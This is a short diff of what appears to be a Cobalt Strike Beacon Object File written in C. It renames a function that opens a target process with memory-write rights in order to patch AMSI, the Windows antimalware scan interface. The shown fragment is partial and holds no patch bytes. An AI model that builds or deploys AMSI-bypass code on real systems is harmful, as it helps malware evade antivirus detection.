@@ -34,7 +34,7 @@ DWORD GetPid(const char * pName) {
 	return 0;
 }
 
-void patchAmsiOpenSession(DWORD pid) {
+void patchAmsiScanBuffer(DWORD pid) {
 	HANDLE hProc = NULL;
 	SIZE_T bytes;
 	hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
@@ -55,5 +55,5 @@ void go(char* args, int len) {
 	if (dwPid == 0)
 			dwPid = KERNEL32$GetCurrentProcessId();
 	
-	patchAmsiOpenSession(dwPid);
+	patchAmsiScanBuffer(dwPid);
 }
